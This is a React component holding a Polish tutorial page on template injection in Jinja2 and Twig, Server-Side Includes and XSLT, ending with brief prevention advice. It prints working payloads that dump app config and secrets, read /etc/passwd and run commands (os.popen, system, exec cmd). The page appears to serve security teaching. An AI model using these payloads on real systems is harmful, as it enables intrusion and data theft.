import { Link } from 'react-router-dom';
import ExampleFrame from '../../exampleFrame/ExampleFrame';
import ssti_schemat from '../../../assets/ssti_schemat.png';
import ssti_result from '../../../assets/ssti_result.png';
import ssti_jinja2 from '../../../assets/ssti_jinja2.png';
import ssti_jinja2_exploiting  from '../../../assets/ssti_jinja2_exploiting.png';
import ssti_jinja2_exploiting_2  from '../../../assets/ssti_jinja2_exploiting_2.png';
import ssti_jinja2_rce  from '../../../assets/ssti_jinja2_rce.png';
import sstj_twig  from '../../../assets/sstj_twig.png';
import sstj_twig_lfi  from '../../../assets/sstj_twig_lfi.png';
import sstj_twig_rce  from '../../../assets/sstj_twig_rce.png';
import xslt_example  from '../../../assets/xslt_example.png';
import xslt_example_filtr  from '../../../assets/xslt_example_filtr.png';
import xss_in_information  from '../../../assets/xss_in_information.png';
import sstimap  from '../../../assets/sstimap.png';

const SSTI = () => {

    return(
        <section>
            <h1>SSTI (Server-side Template Injection)</h1>

            <p>Aby umożliwić pomyślne wykorzystanie luki w zabezpieczeniach SSTI, musimy najpierw określić silnik szablonów używany przez aplikację internetową. Aby to osiągnąć, możemy wykorzystać niewielkie różnice w zachowaniu różnych silników szablonów. Rozważmy na przykład następujący powszechnie używany przegląd zawierający niewielkie różnice w popularnych silnikach szablonów:</p>
            <ExampleFrame screen={ssti_schemat} />
            <p>Przy różnych próbach możemy zauważyć że obliczenie zostało zrealizowane wraz z identyfikacją template</p>
            <ExampleFrame screen={ssti_result} />

            <hr />

            <h2>Wykorzystanie SSTI - Jinja2</h2>
            <p>Jinja to silnik szablonów powszechnie używany w frameworkach internetowych <span className='important'>Python</span>, takich jak <span className='important'>Flask lub Django</span>. Ładunki w innych frameworkach internetowych mogą zatem być nieco inne. W naszym payloadzie możemy dowolnie wykorzystywać dowolne biblioteki, które są już zaimportowane przez aplikację <span className='important'>Python, bezpośrednio lub pośrednio</span>. Dodatkowo możemy zaimportować dodatkowe biblioteki za pomocą instrukcji <span className='important'>import</span>.</p>

            <p>Na przykład możemy uzyskać konfigurację aplikacji internetowej za pomocą następującego ładunku SSTI:</p>
            <div className='waring'>
                <p>{`{{ config.items() }}`}</p>
            </div>
            <ExampleFrame screen={ssti_jinja2} />
            <p>Ponieważ ten ładunek zrzuca całą konfigurację aplikacji internetowej, w tym wszelkie użyte tajne klucze, możemy przygotować dalsze ataki, korzystając z uzyskanych informacji. Możemy również wykonać kod Pythona, aby uzyskać informacje o kodzie źródłowym aplikacji internetowej. Możemy użyć następującego ładunku SSTI, aby zrzucić wszystkie dostępne wbudowane funkcje:</p>
            <div className='waring'>
                <p>{`{{ self.__init__.__globals__.__builtins__ }}`}</p>
            </div>
            <ExampleFrame screen={ssti_jinja2_exploiting} />
            <p>Ponieważ ten ładunek zrzuca całą konfigurację aplikacji internetowej, w tym wszelkie użyte tajne klucze, możemy przygotować dalsze ataki, korzystając z uzyskanych informacji. Możemy również wykonać kod Pythona, aby uzyskać informacje o kodzie źródłowym aplikacji internetowej. Możemy użyć następującego ładunku SSTI, aby zrzucić wszystkie dostępne wbudowane funkcje:</p>

            <div className='waring'>
                <p>{`{{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}`}</p>
            </div>  
            <ExampleFrame screen={ssti_jinja2_exploiting_2} />
            <p>Możemy użyć wbudowanej funkcji Pythona open, aby dołączyć plik lokalny. Nie możemy jednak wywołać tej funkcji bezpośrednio; musimy wywołać to ze słownika <span className='important'>__builtins__</span>, który zrzuciliśmy wcześniej. W wyniku tego następujący ładunek zawiera plik <span className='important'>/etc/passwd:</span></p>

            <h3>Remote Code Execution (RCE)</h3>

            <p>Aby uzyskać zdalne wykonanie kodu w Pythonie, możemy skorzystać z funkcji udostępnianych przez bibliotekę <span className='important'>os, takich jak system czy popen</span>. Jeśli jednak aplikacja internetowa nie zaimportowała jeszcze tej biblioteki, musimy ją najpierw zaimportować, wywołując wbudowaną funkcję <span className='important'>import</span>. Powoduje to następujący ładunek SSTI:</p>
            <div className='waring'>
                <p>{`{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}`}</p>
            </div>
            <ExampleFrame screen={ssti_jinja2_rce} />

            <hr />

            <h2>Wykorzystanie SSTI - Twig</h2>
            <p>Twig to silnik szablonów dla języka programowania <span className='important'>PHP</span>.</p>

            <div className='waring'>
                <p>W Twigu możemy użyć słowa kluczowego <span className='important'>_self</span>, aby uzyskać trochę informacji o bieżącym szablonie:</p>
            </div>
            <ExampleFrame screen={sstj_twig} />

            <h3>Local File Inclusion (LFI)</h3>
            <p>Odczyt plików lokalnych (bez korzystania z tego samego sposobu, w jaki będziemy korzystać z RCE) nie jest możliwy przy użyciu wewnętrznych funkcji udostępnianych bezpośrednio przez Twiga. Jednak framework <span className='important'>PHP Symfony</span> definiuje dodatkowe filtry Twig. Jednym z tych filtrów jest <span className='important'>file_excerpt</span> i można go użyć do odczytu plików lokalnych:</p>

            <div className='waring'>
                <p>{`{{ "/etc/passwd"|file_excerpt(1,-1) }}`}</p>
            </div>

            <ExampleFrame screen={sstj_twig_lfi} />

            <h3>Remote Code Execution (RCE)</h3>
            <p>Aby uzyskać zdalne wykonanie kodu, możemy skorzystać z wbudowanej funkcji PHP, takiej jak <span className='important'>system</span>. Możemy przekazać argument do tej funkcji, korzystając z <span className='important'>funkcji filtrującej Twiga</span>, w wyniku czego otrzymamy dowolny z następujących ładunków SSTI:</p>

            <div className='waring'>
                <p>{`{{ ['id'] | filter('system') }}`}</p>
            </div>
            <ExampleFrame screen={sstj_twig_rce} />

            <hr />


            <h2>Server-Side Includes (SSI)</h2>

            <p>SSI wykorzystuje dyrektywy do dodawania dynamicznie generowanej zawartości do statycznej strony HTML. Dyrektywy te składają się z następujących elementów:</p>
            <p><span className='important'>name</span> nazwa dyrektywy</p>
            <p><span className='important'>parameter name</span> jeden lub więcej parametrów</p>
            <p><span className='important'>value</span> jedną lub więcej wartości parametrów</p>

            <div className='waring'>
                <p>{`<!--#name param1="value1" param2="value" -->`}</p>
                <p>{`<!--#printenv -->`}</p>
                <p>{`<!--#config errmsg="Error!" -->`}</p>
            </div>

            <p>Dyrektywa ta wypisuje wartość dowolnej zmiennej podanej w parametrze var. Można wydrukować wiele zmiennych, określając wiele parametrów var. Na przykład obsługiwane są następujące zmienne:</p>

            <p><span className='important'>DOCUMENT_NAME</span> nazwa bieżącego pliku</p>
            <p><span className='important'>DOCUMENT_URI</span> URI bieżącego pliku</p>
            <p><span className='important'>LAST_MODIFIED</span> znacznik czasu ostatniej modyfikacji bieżącego pliku</p>
            <p><span className='important'>DATE_LOCAL</span> czas lokalnego serwera</p>

            <div className='waring'>
                <p>{`<!--#echo var="DOCUMENT_NAME" var="DATE_LOCAL" -->`}</p>
                <p>{`<!--#exec cmd="whoami" -->`}</p>
                <p>{`<!--#include virtual="index.html" -->`}</p>
            </div>

            <hr />

            <h2>eXtensible Stylesheet Language Transformation (XSLT)</h2>
            <p>Działa na danych opartych na formacie XML</p>

            <p>W XSLT można zdefiniować format danych, który następnie zostanie wzbogacony o dane z dokumentu XML. Dane XSLT mają strukturę podobną do XML. Zawiera jednak elementy XSL w węzłach poprzedzonych przedrostkiem xsl. Poniżej przedstawiono niektóre powszechnie używane elementy XSL:</p>

            <p><span className='important'>{`<xsl:template>`}</span> Ten element wskazuje szablon XSL. Może zawierać <span className='important'>atrybut dopasowania zawierający</span> ścieżkę w dokumencie XML, do którego odnosi się szablon</p>
            <p><span className='important'>{`<xsl:value-of>`}</span> Ten element wyodrębnia wartość węzła XML określoną w atrybucie <span className='important'>Select</span></p>
            <p><span className='important'>{`<xsl:for-each>:`}</span> Ten element umożliwia zapętlenie wszystkich węzłów XML określonych w atrybucie <span className='important'>Select</span></p>

            <ExampleFrame screen={xslt_example} />
            <p>Jak widzimy, dokument XSLT zawiera pojedynczy element XSL <span className='important'>{`<xsl:template>`}</span>, który jest zastosowany do węzła <span className='important'>{`<fruits>`}</span> w dokumencie XML. Szablon składa się ze statycznego łańcucha Oto <span className='important'>wszystkie owoce</span>: i pętli nad wszystkimi węzłami <span className='important'>{`<fruit>`}</span> w dokumencie XML. Dla każdego z tych węzłów wartości węzłów <span className='important'>{`<name> i <color>`}</span> są drukowane przy użyciu elementu XSL <span className='important'>{`<xsl:value-of>`}</span>. Połączenie przykładowego dokumentu XML z powyższymi danymi XSLT daje następujący wynik:</p>

            <div className='waring'>
                <p>Here are all the fruits:</p>
                <p className='tab-1'>Apple (Red)</p>
                <p className='tab-1'>Banana (Yellow)</p>
                <p className='tab-1'>Strawberry (Red)</p>
            </div>

            <p>Oto kilka dodatkowych elementów XSL, których można użyć w celu dalszego zawężenia lub dostosowania danych z dokumentu XML:</p>

            <p><span className='important'>{`<xsl:sort>`}</span> Ten element określa sposób sortowania elementów w pętli for w argumencie <span className='important'>Select</span>. Dodatkowo w argumencie zamówienia można określić <span className='important'>order</span> sortowania</p>
            <p><span className='important'>{`<xsl:if>`}</span>Tego elementu można używać do testowania warunków w węźle. Warunek jest określony w argumencie <span className='important'>testowym</span>.</p>

            <p>Na przykład możemy użyć tych elementów XSL, aby utworzyć listę wszystkich owoców średniej wielkości, uporządkowanych według koloru w kolejności malejącej:</p>
            
            <ExampleFrame screen={xslt_example_filtr} />
            
            <p>Możemy spróbować wywnioskować podstawowe informacje o używanym procesorze XSLT poprzez wstrzyknięcie następujących elementów XSLT:</p>

            <div className='waring'>
                <p>{`Version: <xsl:value-of select="system-property('xsl:version')" />`}</p>
                <p>{`<br/>`}</p>
                <p>{`Vendor: <xsl:value-of select="system-property('xsl:vendor')" />`}</p>
                <p>{`<br/>`}</p>
                <p>{`Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" />`}</p>
                <p>{`<br/>`}</p>
                <p>{`Product Name: <xsl:value-of select="system-property('xsl:product-name')" />`}</p>
                <p>{`<br/>`}</p>
                <p>{`Product Version: <xsl:value-of select="system-property('xsl:product-version')" />`}</p>
            </div>
            
            <ExampleFrame screen={xss_in_information} />
            
            <h3>Local File Inclusion (LFI)</h3>
            <p>Możemy spróbować użyć wielu różnych funkcji do odczytania pliku lokalnego. To, czy ładunek będzie działać, zależy od wersji XSLT i konfiguracji biblioteki XSLT</p>

            <div className='waring'>
                <p>{`<xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')" />`}</p>
            </div>

            <p>Jednak został wprowadzony dopiero w wersji XSLT 2.0. Dlatego nasza przykładowa aplikacja internetowa nie obsługuje tej funkcji i zamiast tego pojawiają się błędy. Jeśli jednak biblioteka XSLT jest skonfigurowana do obsługi funkcji PHP, możemy wywołać funkcję PHP <span className='important'>file_get_contents</span> za pomocą następującego elementu XSLT:</p>

            <div className='waring'>
                <p>{`<xsl:value-of select="php:function('file_get_contents','/etc/passwd')" />`}</p>
            </div>

            <h3>Remote Code Execution (RCE)</h3>

            <div className='waring'>
                <p>{`<xsl:value-of select="php:function('system','id')" />`}</p>
            </div>

            <hr />

            <Link to='https://github.com/FilipowiczP/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md'>PayloadsAllTheThings - Server Side Template Injection</Link>
            <br />
            <Link to='https://github.com/FilipowiczP/SSTImap'>SSTI - automatyczne narzędzie do wykrywania oraz wykorzystywania payload</Link>
            <ExampleFrame screen={sstimap} />

            <hr />

            <h2 className='defense'>Zapobieganie</h2>
            <p className='defense'>Aby zapobiec lukom w zabezpieczeniach SSTI, musimy upewnić się, że dane wejściowe użytkownika nigdy nie zostaną wprowadzone do wywołania funkcji renderowania silnika szablonów w parametrze szablonu. Można to osiągnąć, ostrożnie przechodząc przez różne ścieżki kodu i upewniając się, że dane wejściowe użytkownika nigdy nie są dodawane do szablonu przed wywołaniem funkcji renderującej.</p>

        </section>
    )
};

export default SSTI;